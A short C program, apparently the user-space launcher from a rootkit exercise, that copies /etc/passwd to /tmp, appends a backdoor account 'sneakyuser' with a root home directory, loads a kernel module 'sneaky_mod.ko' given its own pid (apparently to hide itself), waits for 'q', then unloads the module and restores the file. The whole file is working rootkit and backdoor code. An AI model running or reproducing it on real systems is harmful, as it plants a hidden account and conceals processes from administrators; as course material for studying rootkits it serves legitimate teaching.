#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main(){
  printf("sneaky_process pid = %d\n", getpid());

  system("cp /etc/passwd /tmp");
  system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash' >> /etc/passwd");

  char cmd[100];
  sprintf(cmd, "insmod sneaky_mod.ko pid=%d pid_1=%d", getpid(), getpid()-1);
  system(cmd);

  char c;
  while((c = getchar())!='q'){
  }

  system("rmmod sneaky_mod");

  system("cp /tmp/passwd /etc");
  return EXIT_SUCCESS;
}